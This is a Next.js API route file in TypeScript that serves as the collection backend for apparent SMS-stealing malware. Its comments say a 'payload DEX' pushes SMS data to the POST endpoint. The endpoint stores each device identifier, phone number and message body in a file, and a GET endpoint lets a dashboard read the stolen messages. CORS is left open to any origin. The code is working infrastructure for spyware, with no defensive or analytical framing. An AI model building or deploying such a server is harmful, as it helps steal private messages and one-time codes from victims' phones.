import { NextRequest, NextResponse } from "next/server";
import { promises as fs } from "fs";
import path from "path";

const DATA_FILE = path.join("/tmp", "ytpro_sms.json");

async function readEntries(): Promise<object[]> {
  try {
    const raw = await fs.readFile(DATA_FILE, "utf-8");
    return JSON.parse(raw);
  } catch {
    return [];
  }
}

// GET /api/data — dashboard reads collected SMS
export async function GET() {
  const entries = await readEntries();
  return NextResponse.json({ entries });
}

// POST /api/data — payload DEX pushes SMS data here
export async function POST(req: NextRequest) {
  const body = await req.json();

  const entry = {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    device: body.device || "unknown",
    number: body.number || "",
    body: body.body || "",
    ts: Date.now(),
  };

  const entries = await readEntries();
  entries.unshift(entry);

  // Keep last 500 entries
  const trimmed = entries.slice(0, 500);
  await fs.writeFile(DATA_FILE, JSON.stringify(trimmed), "utf-8");

  return NextResponse.json({ ok: true }, {
    headers: { "Access-Control-Allow-Origin": "*" },
  });
}

export async function OPTIONS() {
  return new NextResponse(null, {
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}
